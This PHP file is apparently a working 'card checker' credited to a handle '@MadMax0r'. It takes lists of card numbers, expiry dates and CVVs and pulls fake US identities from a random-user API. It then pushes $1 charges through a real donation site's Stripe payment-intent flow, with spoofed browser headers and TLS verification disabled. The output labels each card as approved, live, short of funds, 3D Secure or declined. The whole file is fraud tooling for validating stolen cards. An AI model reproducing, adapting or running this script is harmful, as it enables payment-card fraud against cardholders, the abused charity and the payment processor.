<?php
#[ SITE & CODED BY - @MadMax0r ]

#==================[SETUP]
error_reporting(0);
set_time_limit(0);
error_reporting(0);
date_default_timezone_set('America/Buenos_Aires');
function multiexplode($delimiters, $string)
{
  $one = str_replace($delimiters, $delimiters[0], $string);
  $two = explode($delimiters[0], $one);
  return $two;
}
$lista = $_GET['lista'];
$cc = multiexplode(array(":", "|", ""), $lista)[0];
$mes = multiexplode(array(":", "|", ""), $lista)[1];
$ano = multiexplode(array(":", "|", ""), $lista)[2];
$cvv = multiexplode(array(":", "|", ""), $lista)[3];

function GetStr($string, $start, $end)
{
  $str = explode($start, $string);
  $str = explode($end, $str[1]);
  return $str[0];
}
#==============[Randomizing Details Api]
$get = file_get_contents('https://randomuser.me/api/1.2/?nat=us');
preg_match_all("(\"first\":\"(.*)\")siU", $get, $matches1);
$fname = $matches1[1][0];
preg_match_all("(\"last\":\"(.*)\")siU", $get, $matches1);
$lname = $matches1[1][0];
preg_match_all("(\"email\":\"(.*)\")siU", $get, $matches1);
$email = $matches1[1][0];
preg_match_all("(\"street\":\"(.*)\")siU", $get, $matches1);
$add = $matches1[1][0];
preg_match_all("(\"city\":\"(.*)\")siU", $get, $matches1);
$city = $matches1[1][0];
preg_match_all("(\"state\":\"(.*)\")siU", $get, $matches1);
$state = $matches1[1][0];
preg_match_all("(\"phone\":\"(.*)\")siU", $get, $matches1);
$num = $matches1[1][0];
preg_match_all("(\"postcode\":(.*),\")siU", $get, $matches1);
$zip = $matches1[1][0];

#=====================[1st REQ]
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://donate2.app/api/stripe/idempotency-key');
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_ENCODING, 'gzip, deflate');
$headers = array();
$headers[] = 'Authority: donate2.app';
$headers[] = 'Content-Length: 0';
$headers[] = 'Sec-Ch-Ua: \" Not A;Brand\";v=\"99\", \"Chromium\";v=\"99\"';
$headers[] = 'Accept: */*';
$headers[] = 'X-Requested-With: XMLHttpRequest';
$headers[] = 'Sec-Ch-Ua-Mobile: ?1';
$headers[] = 'User-Agent: Mozilla/5.0 (Linux; Android 10; SM-J810G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.66 Mobile Safari/537.36';
$headers[] = 'Sec-Ch-Ua-Platform: \"Android\"';
$headers[] = 'Origin: https://donate2.app';
$headers[] = 'Sec-Fetch-Site: same-origin';
$headers[] = 'Sec-Fetch-Mode: cors';
$headers[] = 'Sec-Fetch-Dest: empty';
$headers[] = 'Referer: https://donate2.app/rZE6sK';
$headers[] = 'Accept-Language: en-GB,en-US;q=0.9,en;q=0.8';
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt'); 
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
$result1 = curl_exec($ch);
#echo($result1);
$tk = trim(strip_tags(getStr($result1,'"idempotencyKey":"','"')));
#echo "IDEMPOTENCY KEY: $tk<br><hr>";
#==================[2 REQ]
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://donate2.app/api/intent');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'POST');
curl_setopt($ch, CURLOPT_ENCODING, 'gzip, deflate');
$headers = array();
$headers[] = 'Authority: donate2.app';
$headers[] = 'Sec-Ch-Ua: \" Not A;Brand\";v=\"99\", \"Chromium\";v=\"99\"';
$headers[] = 'Accept: */*';
$headers[] = 'Content-Type: application/x-www-form-urlencoded; charset=UTF-8';
$headers[] = 'X-Requested-With: XMLHttpRequest';
$headers[] = 'Sec-Ch-Ua-Mobile: ?1';
$headers[] = 'User-Agent: Mozilla/5.0 (Linux; Android 10; SM-J810G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.66 Mobile Safari/537.36';
$headers[] = 'Sec-Ch-Ua-Platform: \"Android\"';
$headers[] = 'Origin: https://donate2.app';
$headers[] = 'Sec-Fetch-Site: same-origin';
$headers[] = 'Sec-Fetch-Mode: cors';
$headers[] = 'Sec-Fetch-Dest: empty';
$headers[] = 'Referer: https://donate2.app/rZE6sK';
$headers[] = 'Accept-Language: en-GB,en-US;q=0.9,en;q=0.8';
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt'); 
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_POSTFIELDS, 'amount=100&form_id=rZE6sK&fund_id=372&cover_our_cost=0&anonymous_donation=0&fund_type=fund&frequency=0&marketing_communications=0&gift_aid=0&promo_code=&vimeo_plan=&gifting=&default_ask=&gc_amount_to_apply=&gift_certificate=&address%5Bprefix%5D=&address%5BfirstName%5D='.$fname.'&address%5BlastName%5D='.$lname.'&address%5Bsuffix%5D=&address%5Bemail%5D=&address%5Bstreet1%5D='.$add.'&address%5Bstreet2%5D=&address%5Bcity%5D='.$city.'&address%5Bstate%5D='.$state.'&address%5BpostalCode%5D='.$zip.'&address%5Bcountry%5D=1&address%5Bphone%5D='.$num.'&idempotencyKey='.$tk.'&sourceNoOverride=');
$result2 = curl_exec($ch);
#echo($result2);
$pid = trim(strip_tags(getStr($result2,'"result":true,"client_secret":"','_secret_')));
$psid = trim(strip_tags(getStr($result2,'"result":true,"client_secret":"','"')));
#echo "PI ID: $pid<br><hr>";
#echo "PI SECRET ID: $psid<br><hr>";
#==================[3 REQ]
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/payment_intents/'.$pid.'/confirm');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'POST');
curl_setopt($ch, CURLOPT_ENCODING, 'gzip, deflate');
$headers = array();
$headers[] = 'Authority: api.stripe.com';
$headers[] = 'Sec-Ch-Ua: \" Not A;Brand\";v=\"99\", \"Chromium\";v=\"99\"';
$headers[] = 'Accept: application/json';
$headers[] = 'Content-Type: application/x-www-form-urlencoded';
$headers[] = 'Sec-Ch-Ua-Mobile: ?1';
$headers[] = 'User-Agent: Mozilla/5.0 (Linux; Android 10; SM-J810G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.66 Mobile Safari/537.36';
$headers[] = 'Sec-Ch-Ua-Platform: \"Android\"';
$headers[] = 'Origin: https://js.stripe.com';
$headers[] = 'Sec-Fetch-Site: same-site';
$headers[] = 'Sec-Fetch-Mode: cors';
$headers[] = 'Sec-Fetch-Dest: empty';
$headers[] = 'Referer: https://js.stripe.com/';
$headers[] = 'Accept-Language: en-GB,en-US;q=0.9,en;q=0.8';
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt'); 
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_POSTFIELDS, 'payment_method_data[type]=card&payment_method_data[billing_details][name]='.$fname.'+'.$lname.'&payment_method_data[billing_details][email]='.$email.'&payment_method_data[billing_details][address][postal_code]='.$zip.'&payment_method_data[card][number]='.$cc.'&payment_method_data[card][cvc]='.$cvv.'&payment_method_data[card][exp_month]='.$mes.'&payment_method_data[card][exp_year]='.$ano.'&payment_method_data[guid]=NA&payment_method_data[muid]=NA&payment_method_data[sid]=NA&payment_method_data[pasted_fields]=number&payment_method_data[payment_user_agent]=stripe.js%2F10dd13b87%3B+stripe-js-v3%2F10dd13b87&payment_method_data[time_on_page]=386046&expected_payment_method_type=card&use_stripe_sdk=true&key=pk_live_LKapnu0xEWIss4ThSIewmbWd&_stripe_account=acct_1IlDENELEW9cpeLq&_stripe_version=2020-03-02&client_secret='.$psid.'');
$result3 = curl_exec($ch);
#echo($result3);
$msg = trim(strip_tags(getStr($result3,'"message": "','"')));
#echo "MESSAGE: $msg<br><hr>";
#===============[Card Response]
if((strpos($result3,  '"status": "succeeded"'))) {
  echo "<font size=2 color='black'>  <font class='badge badge-info'>#Aprovadas Card : $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-light'>Charged 1$ [@MadMax0r]</span></i></font>";
}
elseif
(strpos($result3,  "funds")) {
  echo "<font size=2 color='black'>  <font class='badge badge-info'>#Aprovadas Card : $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-light'>Insufficient Funds</span></i></font> <br><font class='badge badge-dark'>Message : $msg [@MadMax0r]";
}
elseif
(strpos($result3,  "security")) {
  echo "<font size=2 color='black'>  <font class='badge badge-info'>#Ccn Card : $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-light'>Ccn Live</span></i></font> <br><font class='badge badge-dark'>Message : $msg [@MadMax0r]";
}
elseif
(strpos($result3,"requires_action")) {
  echo "<font size=2 color='black'>  <font class='badge badge-info'>#Reprovadas Card : $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-light'>Message : 3d Secure Card. [@MadMax0r]";
}
else
{
  echo "<font size=2 color='black'>  <font class='badge badge-info'>#Reprovadas Card : $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-light'>Message : $msg [@MadMax0r]";
}

curl_close($ch);
ob_flush();
?>